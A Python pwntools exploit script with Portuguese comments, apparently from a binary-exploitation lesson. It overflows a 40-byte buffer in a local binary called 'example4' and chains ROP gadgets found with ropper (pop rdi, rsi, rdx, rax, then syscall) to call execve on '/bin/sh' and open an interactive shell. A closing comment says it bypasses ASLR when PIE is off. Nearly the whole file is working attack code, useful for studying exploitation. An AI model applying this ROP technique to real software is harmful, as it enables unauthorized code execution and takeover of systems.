#!/usr/bin/python3
from pwn import *

# 59	sys_execve	const char *filename	const char *const argv[]	const char *const envp[]
# http://blog.rchapman.org/posts/Linux_System_Call_Table_for_x86_64/

#analise estatica: 

#strings
#gef➤  info variables ez
#0x00000000004c00f0  ez
#gef➤  x/1s 0x00000000004c00f0
#0x4c00f0 <ez>:  "/bin/sh"

#gadgets
#pip3 install ropper
#ropper --file example4 --search "pop"
#ropper --file example4 --search "syscall"
#0x000000000040176f: pop rdx; ret;
#0x000000000040f38e: pop rsi; ret;
#0x000000000040186a: pop rdi; ret;
#0x0000000000449a17: pop rax; ret;
#0x0000000000416fd4: syscall; ret;

pop_rdx = p64(0x000000000040176f)
pop_rsi = p64(0x000000000040f38e)
pop_rdi = p64(0x000000000040186a)
pop_rax = p64(0x0000000000449a17)
syscall = p64(0x0000000000416fd4)

shellString = p64(0x4c00f0)

#pip3 install pwntools



#cria um processo e se conecta a ele
p = process("example4")

#cria um payload para enviar. 16 A's para o buffer, 8 A's para o rbp salvo na pilha e um ponteiro para o endereço desejado
tamanhoTotal=32+8

## Pading
## pop_rsi
## 0
## pop rdx
## 0
## pop rdi
## &"/bin/sh"
## pop rax
## 59
## syscall
payload = b"\x90"*tamanhoTotal + pop_rsi + p64(0) + pop_rdx + p64(0) + pop_rdi + shellString + pop_rax + p64(59) + syscall




input(">")


p.sendline(payload)
p.interactive()

#funciona independente de ASLR, desde que o PIE esteja desativado na compilação


